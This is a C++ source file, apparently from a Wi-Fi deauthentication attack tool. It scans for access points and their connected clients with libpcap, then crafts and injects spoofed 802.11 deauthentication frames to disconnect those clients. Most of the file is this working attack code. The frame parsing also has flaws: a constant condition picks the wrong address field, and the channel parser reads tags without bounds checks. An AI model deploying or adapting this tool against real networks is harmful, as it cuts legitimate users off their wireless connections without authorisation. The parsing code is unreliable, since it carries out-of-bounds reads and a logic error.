#include "main.h"
#include "ieee80211.h"
#include "station.h"

using namespace std;

static uint8_t my_mac[] = MY_MAC;
static uint8_t broadcast_mac[] = BROADCAST_MAC;

void print_mac(uint8_t *mac_addr) {
    for (int i = 0; i < 6; i++) {
        if (i) printf(":");
        printf("%.2x", (int)mac_addr[i]);
    }
}

bool cmp_macs(uint8_t *mac_addr1, uint8_t *mac_addr2) {
    for (int i = 0; i != ETH_ALEN; i++) {
        if (mac_addr1[i] != mac_addr2[i])
            return false;
    }
    
    return true;
}

string format_mac(uint8_t *mac_addr) {
    char mac_str[18];
    
    snprintf(mac_str, sizeof(mac_str),
        "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
        mac_addr[0], mac_addr[1], mac_addr[2],
        mac_addr[3], mac_addr[4], mac_addr[5]
    );
    
    return string(mac_str);
}

int parse_channel(u_char *tags, size_t len) {
    u_int offset = 0;
    int channel = 0;
    
    while (1) {
        if (offset >= len)
            break;

        if (tags[offset] == CHANNEL_T) {
            channel = tags[offset + 2];
            
            return channel;
        } else {
            offset += tags[offset + 1] + 2;
        }
    }
    
    return channel;
}

u_char * parse_ssid(u_char *tags, size_t tlen, size_t *rlen) {
    size_t offset = 0;
    
    while (offset + 1 < tlen) {
        if (tags[offset] == SSID_T) {
            offset++;
            size_t ssid_l = (size_t)tags[offset];
            
            if (ssid_l + offset > tlen)
                return (u_char *) NULL;
            
            *rlen = ssid_l;
            
            return &(tags[offset + 1]);
        } else {
            offset += tags[offset + 1] + 2;
        }
    }
    
    return (u_char *) NULL;
}

void send_probe(pcap_t *descr) {
    const uint8_t rtap[] = {
        0x00, 0x00, 0x18, 0x00, 0x0f, 0x80, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    const ieee80211_hdr wifi = {
        .frame_control = PROBE_Q_T,
        .duration_id = 0,
        .addr1 = BROADCAST_MAC,
        .addr2 = MY_MAC,
        .addr3 = BROADCAST_MAC,
        .seq_ctrl = 0
    };
    
    const uint8_t ieee80211_tags[] = {
        0x00, 0x00
    };
    
    size_t psize = sizeof(rtap) + sizeof(wifi) + sizeof(ieee80211_tags);
    uint8_t packet[psize];
    
    memcpy(packet, &rtap, sizeof(rtap));
    memcpy(packet + sizeof(rtap), &wifi, sizeof(wifi));
    memcpy(packet + sizeof(rtap) + sizeof(wifi),
    &ieee80211_tags, sizeof(ieee80211_tags));
    
     if (pcap_sendpacket(descr, packet, psize) != 0)
         cout << "Sending probe failed!\n";
}

void send_deauth(
        pcap_t *descr, uint8_t *peer,
        uint8_t *station, bool to_ds,
        uint8_t seq
) {
    const uint8_t rtap[] = {
        0x00, 0x00, 0x18, 0x00, 0x0f, 0x80, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    
    ieee80211_hdr wifi = {
        .frame_control = DEAUTH_T,
        .duration_id = 0,
        .addr1 = BROADCAST_MAC,
        .addr2 = BROADCAST_MAC,
        .addr3 = BROADCAST_MAC,
        .seq_ctrl = 0
    };
    
    if (!to_ds) {
        memcpy(wifi.addr1, peer, ETH_ALEN);
        memcpy(wifi.addr2, station, ETH_ALEN);
    } else {
        memcpy(wifi.addr1, station, ETH_ALEN);
        memcpy(wifi.addr2, peer, ETH_ALEN);
    }
    memcpy(wifi.addr3, station, ETH_ALEN);
    
    const uint8_t ieee80211_tags[] = {
        0x07, 0x00
    };
    
    uint8_t *seq_h = (uint8_t *)&(wifi.seq_ctrl);
    seq_h[0] = ((int)seq & 0x0000000F) << 4;
    seq_h[1] = ((int)seq & 0x00000FF0) >> 4;
    
    size_t psize = sizeof(rtap) + sizeof(wifi) + sizeof(ieee80211_tags);
    uint8_t packet[psize];
    
    memcpy(packet, &rtap, sizeof(rtap));
    memcpy(packet + sizeof(rtap), &wifi, sizeof(wifi));
    memcpy(packet + sizeof(rtap) + sizeof(wifi),
    &ieee80211_tags, sizeof(ieee80211_tags));
    
     if (pcap_sendpacket(descr, packet, psize) != 0)
         cout << "Sending deauth failed!\n";
}

void peer_scan_handler (
        u_char *userData,
        const struct pcap_pkthdr* pkthdr,
        const u_char* packet
) {
    u_char *layer = (u_char *)packet;
    Station *ap = (Station *)userData;
    
    if (pkthdr->len < sizeof(struct ieee80211_radiotap_hdr)
    ) {
        return;
    }
        
    struct ieee80211_radiotap_hdr *rtap = 
    (struct ieee80211_radiotap_hdr *) layer;
    
    layer += rtap->it_len;

    struct ieee80211_hdr *whdr =
    (struct ieee80211_hdr *)layer;
    
    uint8_t f_type_hdr = ((uint8_t *)(&whdr->frame_control))[0];
    uint8_t f_flags_hdr = ((uint8_t *)(&whdr->frame_control))[1];
    
    uint8_t f_type = f_type_hdr & TYPE_M;
    uint8_t f_subtype = f_type_hdr & SUBTYPE_M;
    
    uint8_t ds_flags = f_flags_hdr & DS_M;
    
    if (f_type == DATA_T) {
        if (ds_flags != FROM_DS_T && ds_flags != TO_DS_T)
            return;
        
        uint8_t broadcast_addr[] = BROADCAST_MAC;
        uint8_t *peer_addr, *station_addr;
        
        if (FROM_DS_T) {
            peer_addr = whdr->addr1;
            station_addr = whdr->addr2;
        } else {
            peer_addr = whdr->addr2;
            station_addr = whdr->addr1;
        }
        
        if (!cmp_macs(station_addr, ap->bssid))
            return;
        
        if (cmp_macs(peer_addr, broadcast_addr))
            return;
        
        ap->add_peer(peer_addr);
    }
    else if (f_type == CONTROL_T &&
            (f_subtype == BLK_ACK_T || f_subtype == REQ_SND_T)
    ) {
        uint8_t *peer_addr = (uint8_t *)NULL;
        
        if (cmp_macs(whdr->addr1, ap->bssid)) {
            peer_addr = whdr->addr2;
        }
        else if (cmp_macs(whdr->addr2, ap->bssid)) {
            peer_addr = whdr->addr1;
        }
        
        if (peer_addr != (uint8_t *)NULL) {
            ap->add_peer(peer_addr);
        }
    }
}

void ap_scan_handler (
        u_char *userData,
        const struct pcap_pkthdr* pkthdr,
        const u_char* packet
) {
    u_char *layer = (u_char *)packet;
    
    if (pkthdr->len < sizeof(struct ieee80211_radiotap_hdr)) {
        return;
    }
        
    struct ieee80211_radiotap_hdr *rtap = 
    (struct ieee80211_radiotap_hdr *) layer;
    
    layer += rtap->it_len;
    
    if (pkthdr->caplen < 
            ((long)layer - (long)packet) +
            sizeof(struct ieee80211_hdr) + FIXED_TAGS_SIZE
    )
        return;

    struct ieee80211_hdr *whdr =
    (struct ieee80211_hdr *)layer;
    
    uint8_t f_type_hdr = ((uint8_t *)(&whdr->frame_control))[0];
    
    uint8_t f_type = f_type_hdr & TYPE_M;
    uint8_t f_subtype = f_type_hdr & SUBTYPE_M;
    
    if (
        (f_type == MANAGEMENT_T) && 
        (f_subtype == PROBE_R_T || f_subtype == BEACON_T)
    ) {
        layer += sizeof(struct ieee80211_hdr);
        layer += FIXED_TAGS_SIZE;
        
        size_t tags_len = pkthdr->len - ((long)layer - (long)packet);
        
        uint8_t channel = (uint8_t) parse_channel(layer, tags_len);

        size_t ssid_len = 0;
        u_char *ssid_p = parse_ssid(layer, tags_len, &ssid_len);
        
        string mac_str = format_mac(whdr->addr3);
        map<string, Station *>::iterator sit = Globals::stations.find(mac_str);
        
        if (sit == Globals::stations.end()) {
            Station *station = new Station(
                    whdr->addr3, ssid_p,
                    ssid_len, channel
            );
            
            Globals::stations[mac_str] = station;
        }
    }
}
